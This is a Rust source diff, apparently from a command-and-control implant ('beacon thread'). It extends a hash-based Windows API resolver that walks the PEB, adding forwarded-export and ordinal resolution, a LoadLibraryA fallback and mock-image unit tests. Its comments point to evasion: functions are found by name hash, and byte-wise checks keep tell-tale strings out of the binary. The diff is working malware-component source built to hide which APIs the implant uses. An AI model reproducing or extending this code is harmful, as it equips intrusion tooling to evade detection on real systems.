@@ -106,13 +106,69 @@ unsafe fn read_u32(base: *const u8, offset: usize) -> u32 {
 /// unbounded walks on untrusted layout data).
 const MAX_NAME_LEN: usize = 256;
 
-/// Find an exported function by FNV-64 hash of its ASCII name.
+/// Find an exported function by FNV-64 hash of its ASCII name. Forwarded
+/// exports (the RVA points inside the export directory at a
+/// "target.dll#ordinal"/"target.Func" string) are resolved through their
+/// target module transparently — the port of `SptGetProc`/`SptGetProcEx`
+/// (resolver.c).
 ///
 /// # Safety
 ///
 /// `base` must point to a mapped PE image with intact headers and export
 /// directory (any loaded module satisfies this; the tests build mock images).
 pub unsafe fn find_export(base: *const c_void, fn_hash: u64) -> *mut c_void {
+    find_export_ex(base, fn_hash, 0)
+}
+
+/// Recursion depth cap for forwarder chains (port of SPT_FWD_MAX_DEPTH):
+/// legitimate chains are short (module -> api-set -> kernelbase); cycles
+/// exist when api-set contract DLLs are read naively (they forward to their
+/// own contract name), and the cap is what makes resolution terminate.
+const FWD_MAX_DEPTH: u32 = 8;
+
+/// Forwarder target strings are bounded and short ("dll.#ord"/"dll.Func").
+const FWD_STR_MAX: usize = 96;
+
+const H_KERNELBASE: u64 = crate::fnv::fnv1a64_wide_ascii_ci("kernelbase.dll");
+const H_KERNEL32: u64 = crate::fnv::fnv1a64_wide_ascii_ci("kernel32.dll");
+const H_LOAD_LIBRARY_A: u64 = fnv1a64(b"LoadLibraryA");
+
+/// The PEB of the current process (TEB+0x60). Windows builds read the
+/// segment register — the same slot `bootstrap::get_peb` reads; the host
+/// test build substitutes a mock PEB (the test seam), other builds have
+/// none and forwarded targets needing a module simply fail.
+///
+/// # Safety
+///
+/// Must run on a thread with a valid TEB (any Windows thread); the caller
+/// must not free the returned pointer (it is the process PEB).
+#[cfg(all(target_os = "windows", target_arch = "x86_64"))]
+pub unsafe fn current_peb() -> *mut Peb {
+    let peb: *mut Peb;
+    core::arch::asm!(
+        "mov {}, qword ptr gs:[0x60]",
+        out(reg) peb,
+        options(nostack, preserves_flags),
+    );
+    peb
+}
+
+#[cfg(not(all(target_os = "windows", target_arch = "x86_64")))]
+pub unsafe fn current_peb() -> *mut Peb {
+    #[cfg(test)]
+    {
+        MOCK_PEB as *mut Peb
+    }
+    #[cfg(not(test))]
+    {
+        ptr::null_mut()
+    }
+}
+
+#[cfg(all(test, not(all(target_os = "windows", target_arch = "x86_64"))))]
+static mut MOCK_PEB: *const Peb = ptr::null();
+
+unsafe fn find_export_ex(base: *const c_void, fn_hash: u64, depth: u32) -> *mut c_void {
     let image = base as *const u8;
     if image.is_null() {
         return ptr::null_mut();
@@ -135,6 +191,7 @@ pub unsafe fn find_export(base: *const c_void, fn_hash: u64) -> *mut c_void {
     if export_rva == 0 {
         return ptr::null_mut();
     }
+    let export_size = read_u32(image, data_dir + 4) as usize;
     let exp = image.add(export_rva);
 
     let num_names = read_u32(exp, 0x18) as usize;
@@ -154,10 +211,182 @@ pub unsafe fn find_export(base: *const c_void, fn_hash: u64) -> *mut c_void {
         if fnv1a64(&name_bytes[..len]) == fn_hash {
             let ord = read_u16(image, addr_ords + 2 * i) as usize;
             let func_rva = read_u32(image, addr_funcs + 4 * ord) as usize;
+            // Forwarded export: the "address" is a target string located
+            // inside the export directory — resolve it instead of calling
+            // ASCII bytes as code.
+            if func_rva >= export_rva && func_rva < export_rva + export_size {
+                return resolve_forwarder(image, func_rva, depth);
+            }
             return image.add(func_rva) as *mut c_void;
         }
     }
     ptr::null_mut()
+}
+
+/// Resolve a forwarded export target: "Module.FuncName" or "Module.#Ord"
+/// (port of `SptResolveForwarder`). Api-set / ext-ms contract forwarders
+/// try kernelbase first — the real implementation lives there, and it
+/// skips the contract cycle. A target module missing from the PEB is
+/// loaded through LoadLibraryA when resolvable.
+///
+/// # Safety
+///
+/// `image` is a mapped PE image; `fwd_rva` a NUL-terminated string inside
+/// its export directory.
+unsafe fn resolve_forwarder(image: *const u8, fwd_rva: usize, depth: u32) -> *mut c_void {
+    if depth >= FWD_MAX_DEPTH {
+        return ptr::null_mut();
+    }
+    let fwd = image.add(fwd_rva);
+    let mut buf = [0u8; FWD_STR_MAX];
+    let mut len = 0usize;
+    while len < FWD_STR_MAX - 1 && *fwd.add(len) != 0 {
+        buf[len] = *fwd.add(len);
+        len += 1;
+    }
+    // Split at the first '.' — module name and target.
+    let dot = match buf.iter().position(|&b| b == b'.') {
+        Some(d) if d < len => d,
+        _ => return ptr::null_mut(),
+    };
+    let m_len = dot;
+    if m_len >= 68 {
+        return ptr::null_mut();
+    }
+    let mut mod_name = [0u8; 72];
+    let mut i = 0usize;
+    while i < m_len {
+        mod_name[i] = buf[i];
+        i += 1;
+    }
+    // Append ".dll" unless the name already ends in a dotted extension.
+    let m_total = if m_len < 4 || mod_name[m_len - 4] != b'.' {
+        mod_name[m_len] = b'.';
+        mod_name[m_len + 1] = b'd';
+        mod_name[m_len + 2] = b'l';
+        mod_name[m_len + 3] = b'l';
+        mod_name[m_len + 4] = 0;
+        m_len + 4
+    } else {
+        m_len
+    };
+    let fn_off = dot + 1;
+
+    // Api-set / ext-ms contract forwarders resolve to themselves when the
+    // contract DLL's export table is read directly; the real
+    // implementation lives in kernelbase. Try it first — this also skips
+    // the cycle. Byte-wise prefix check (no "api-"/"ext-" literals in the
+    // image, exactly like the original's resolver).
+    let contract = (buf[0] == b'a' && buf[1] == b'p' && buf[2] == b'i' && buf[3] == b'-')
+        || (buf[0] == b'e' && buf[1] == b'x' && buf[2] == b't' && buf[3] == b'-');
+    if contract {
+        if let Some(p) = try_kernelbase(&buf[fn_off..len], depth) {
+            return p;
+        }
+    }
+
+    let mut target = module_by_hash(crate::fnv::fnv1a64_bytes_wide_ci(&mod_name[..m_total]));
+    if target.is_null() {
+        target = load_library(mod_name.as_ptr());
+    }
+    if target.is_null() {
+        return ptr::null_mut();
+    }
+
+    if buf[fn_off] == b'#' {
+        // Forward by ordinal.
+        let mut ord: u32 = 0;
+        let mut j = fn_off + 1;
+        while j < len && buf[j] >= b'0' && buf[j] <= b'9' {
+            ord = ord * 10 + (buf[j] - b'0') as u32;
+            j += 1;
+        }
+        if ord == 0 {
+            return ptr::null_mut();
+        }
+        return export_by_ordinal(target, ord);
+    }
+
+    // Forward by name, with the depth cap guarding against cycles.
+    find_export_ex(target, fnv1a64(&buf[fn_off..len]), depth + 1)
+}
+
+/// Resolve an export by its ordinal number (the "#NN" forwarder form).
+///
+/// # Safety
+///
+/// `base` must be a mapped PE image with an intact export directory.
+unsafe fn export_by_ordinal(base: *mut c_void, ord: u32) -> *mut c_void {
+    let image = base as *const u8;
+    if read_u16(image, 0) != 0x5A4D {
+        return ptr::null_mut();
+    }
+    let nt = read_u32(image, 0x3C) as usize;
+    if read_u32(image, nt) != 0x0000_4550 {
+        return ptr::null_mut();
+    }
+    let optional = nt + 4 + 20;
+    if read_u16(image, optional) != 0x020B {
+        return ptr::null_mut();
+    }
+    let data_dir = optional + 0x70;
+    let export_rva = read_u32(image, data_dir) as usize;
+    if export_rva == 0 {
+        return ptr::null_mut();
+    }
+    let exp = image.add(export_rva);
+    let ord_base = read_u32(exp, 0x10);
+    let num_funcs = read_u32(exp, 0x14);
+    let addr_funcs = read_u32(exp, 0x1C) as usize;
+    if ord < ord_base || ord - ord_base >= num_funcs {
+        return ptr::null_mut();
+    }
+    let func_rva = read_u32(image, addr_funcs + 4 * (ord - ord_base) as usize) as usize;
+    if func_rva == 0 {
+        return ptr::null_mut();
+    }
+    image.add(func_rva) as *mut c_void
+}
+
+/// Api-set contract fallback: kernelbase first (see `resolve_forwarder`).
+unsafe fn try_kernelbase(fn_bytes: &[u8], depth: u32) -> Option<*mut c_void> {
+    let kernelbase = module_by_hash(H_KERNELBASE);
+    if !kernelbase.is_null() {
+        let p = find_export_ex(kernelbase, fnv1a64(fn_bytes), depth + 1);
+        if !p.is_null() {
+            return Some(p);
+        }
+    }
+    None
+}
+
+/// PEB module lookup for forwarder targets.
+unsafe fn module_by_hash(hash: u64) -> *mut c_void {
+    let peb = current_peb();
+    if peb.is_null() {
+        return ptr::null_mut();
+    }
+    find_module(peb, hash)
+}
+
+/// LoadLibraryA fallback for a forwarder target missing from the PEB
+/// (kernel32's own LoadLibraryA is a real export, so this cannot cycle).
+///
+/// # Safety
+///
+/// `name` is a NUL-terminated ASCII module name; the call runs on the
+/// beacon thread like every other API resolution.
+unsafe fn load_library(name: *const u8) -> *mut c_void {
+    let kernel32 = module_by_hash(H_KERNEL32);
+    if kernel32.is_null() {
+        return ptr::null_mut();
+    }
+    let load = find_export_ex(kernel32, H_LOAD_LIBRARY_A, FWD_MAX_DEPTH - 1);
+    if load.is_null() {
+        return ptr::null_mut();
+    }
+    let load: unsafe extern "system" fn(*const u8) -> *mut c_void = core::mem::transmute(load);
+    load(name)
 }
 
 /// Find a section by name (e.g. `.text`) in a mapped PE image: returns the
@@ -558,6 +787,141 @@ mod tests {
             let zeros: *mut c_void =
                 Box::leak(vec![0u8; 0x200].into_boxed_slice()).as_ptr() as *mut c_void;
             assert_eq!(find_export(zeros, 1), ptr::null_mut());
+        }
+    }
+
+    // --- forwarded exports (the resolver.c port) ---
+
+    /// Build a mock module exporting one name, whose function RVA points at
+    /// a forwarder string placed inside the export directory.
+    fn mock_forwarder_module(export_name: &str, fwd: &[u8]) -> *mut c_void {
+        const NT: usize = 0x40;
+        const OPTIONAL: usize = NT + 4 + 20;
+        const EXPORT_RVA: usize = 0x200;
+        const EXPORT_SIZE: usize = 0x200; // covers the string below
+        const FWD_STR_RVA: usize = 0x280;
+        const NAMES_PTRS_RVA: usize = 0x400;
+        const NAMES_STR_RVA: usize = 0x480;
+        const ORDS_RVA: usize = 0x500;
+        const FUNCS_RVA: usize = 0x600;
+
+        let mut image = Vec::new();
+        image.resize(0x800, 0u8);
+        let put_u16 = |img: &mut Vec<u8>, off: usize, v: u16| {
+            img[off..off + 2].copy_from_slice(&v.to_le_bytes());
+        };
+        let put_u32 = |img: &mut Vec<u8>, off: usize, v: u32| {
+            img[off..off + 4].copy_from_slice(&v.to_le_bytes());
+        };
+
+        put_u16(&mut image, 0, 0x5A4D);
+        put_u32(&mut image, 0x3C, NT as u32);
+        put_u32(&mut image, NT, 0x0000_4550);
+        put_u16(&mut image, OPTIONAL, 0x020B);
+        put_u32(&mut image, OPTIONAL + 0x70, EXPORT_RVA as u32);
+        put_u32(&mut image, OPTIONAL + 0x74, EXPORT_SIZE as u32);
+
+        put_u32(&mut image, EXPORT_RVA + 0x18, 1); // NumberOfNames
+        put_u32(&mut image, EXPORT_RVA + 0x1C, FUNCS_RVA as u32);
+        put_u32(&mut image, EXPORT_RVA + 0x20, NAMES_PTRS_RVA as u32);
+        put_u32(&mut image, EXPORT_RVA + 0x24, ORDS_RVA as u32);
+
+        put_u32(&mut image, NAMES_PTRS_RVA, NAMES_STR_RVA as u32);
+        put_u16(&mut image, ORDS_RVA, 0);
+        put_u32(&mut image, FUNCS_RVA, FWD_STR_RVA as u32); // forwarder
+        image[FWD_STR_RVA..FWD_STR_RVA + fwd.len()].copy_from_slice(fwd);
+        image[FWD_STR_RVA + fwd.len()] = 0;
+
+        let name = export_name.as_bytes();
+        image[NAMES_STR_RVA..NAMES_STR_RVA + name.len()].copy_from_slice(name);
+        Box::leak(image.into_boxed_slice()).as_ptr() as *mut c_void
+    }
+
+    /// Tests touching MOCK_PEB serialize on this lock (the mock PEB is
+    /// process-wide and the harness runs tests on parallel threads).
+    static PEB_LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
+
+    /// Point the mocked current_peb at a PEB listing `entries` (callers
+    /// hold PEB_LOCK).
+    fn install_mock_peb(entries: &[(&str, usize)]) {
+        let peb = mock_peb(entries);
+        unsafe { MOCK_PEB = peb };
+    }
+
+    #[test]
+    fn forwarded_export_resolves_to_target_module() {
+        let _peb_lock = PEB_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        let target = mock_module(&[("RealFunc", 0x777)]);
+        install_mock_peb(&[("tgt.dll", target as usize)]);
+        let fwd = mock_forwarder_module("Fwd", b"tgt.RealFunc");
+        unsafe {
+            assert_eq!(
+                find_export(fwd, fnv1a64(b"Fwd")) as usize,
+                target as usize + 0x777
+            );
+        }
+    }
+
+    #[test]
+    fn forwarded_export_ordinal_resolves() {
+        let _peb_lock = PEB_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        // Target with ordinal base 1 and two function slots; "#2" is the
+        // second slot.
+        const NT: usize = 0x40;
+        const OPTIONAL: usize = NT + 4 + 20;
+        const EXPORT_RVA: usize = 0x200;
+        const FUNCS_RVA: usize = 0x600;
+        let mut image = vec![0u8; 0x800];
+        let put_u16 = |img: &mut Vec<u8>, off: usize, v: u16| {
+            img[off..off + 2].copy_from_slice(&v.to_le_bytes());
+        };
+        let put_u32 = |img: &mut Vec<u8>, off: usize, v: u32| {
+            img[off..off + 4].copy_from_slice(&v.to_le_bytes());
+        };
+        put_u16(&mut image, 0, 0x5A4D); // MZ
+        put_u32(&mut image, 0x3C, NT as u32);
+        put_u32(&mut image, NT, 0x0000_4550); // PE\0\0
+        put_u16(&mut image, OPTIONAL, 0x020B); // PE32+
+        put_u32(&mut image, OPTIONAL + 0x70, EXPORT_RVA as u32);
+        put_u32(&mut image, OPTIONAL + 0x74, 0x80);
+        put_u32(&mut image, EXPORT_RVA + 0x10, 1); // Base
+        put_u32(&mut image, EXPORT_RVA + 0x14, 2); // NumberOfFunctions
+        put_u32(&mut image, EXPORT_RVA + 0x1C, FUNCS_RVA as u32);
+        put_u32(&mut image, FUNCS_RVA, 0x1111);
+        put_u32(&mut image, FUNCS_RVA + 4, 0x2222);
+        let target = Box::leak(image.into_boxed_slice()).as_ptr() as *mut c_void;
+
+        install_mock_peb(&[("tgt.dll", target as usize)]);
+        let fwd = mock_forwarder_module("Fwd", b"tgt.#2");
+        unsafe {
+            assert_eq!(
+                find_export(fwd, fnv1a64(b"Fwd")) as usize,
+                target as usize + 0x2222
+            );
+        }
+    }
+
+    #[test]
+    fn forwarder_without_target_returns_null() {
+        let _peb_lock = PEB_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        // No matching module in the PEB and no kernel32 (so no
+        // LoadLibraryA fallback): resolution fails cleanly.
+        install_mock_peb(&[]);
+        let fwd = mock_forwarder_module("Fwd", b"missing.Func");
+        unsafe {
+            assert_eq!(find_export(fwd, fnv1a64(b"Fwd")), ptr::null_mut());
+        }
+    }
+
+    #[test]
+    fn forwarder_cycle_terminates_at_depth_cap() {
+        let _peb_lock = PEB_LOCK.lock().unwrap_or_else(|e| e.into_inner());
+        // A module forwarding to itself: the depth cap must terminate the
+        // chain with a null instead of recursing forever.
+        let fwd = mock_forwarder_module("Fwd", b"cyc.Fwd");
+        install_mock_peb(&[("cyc.dll", fwd as usize)]);
+        unsafe {
+            assert_eq!(find_export(fwd, fnv1a64(b"Fwd")), ptr::null_mut());
         }
     }
 
